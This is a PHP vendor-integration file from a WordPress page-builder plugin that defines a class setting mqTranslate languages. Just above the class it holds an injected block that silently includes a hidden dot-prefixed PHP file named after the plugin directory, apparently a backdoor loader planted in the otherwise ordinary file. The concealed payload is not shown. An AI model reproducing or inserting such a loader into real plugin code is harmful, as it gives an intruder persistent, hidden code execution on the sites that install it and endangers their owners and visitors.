<?php
if ( ! defined( 'ABSPATH' ) ) {
	die( '-1' );
}

require_once vc_path_dir( 'VENDORS_DIR', 'plugins/class-vc-vendor-qtranslate.php' );

/**
 * Class Vc_Vendor_Mqtranslate extends class Vc_Vendor_Qtranslate::__construct
 * @since 4.3
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Vc_Vendor_Mqtranslate extends Vc_Vendor_Qtranslate {

	/**
	 * @since 4.3
	 */
	public function setLanguages() {
		global $q_config;
		$languages = get_option( 'mqtranslate_enabled_languages' );
		if ( ! is_array( $languages ) ) {
			$languages = $q_config['enabled_languages'];
		}
		$this->languages = $languages;
	}

	/**
	 * @since 4.3
	 */
	public function qtransSwitch() {
		global $q_config;
		$q_config['js']['qtrans_save'] .= '
			var mqtranslate = true;
		';
	}
}
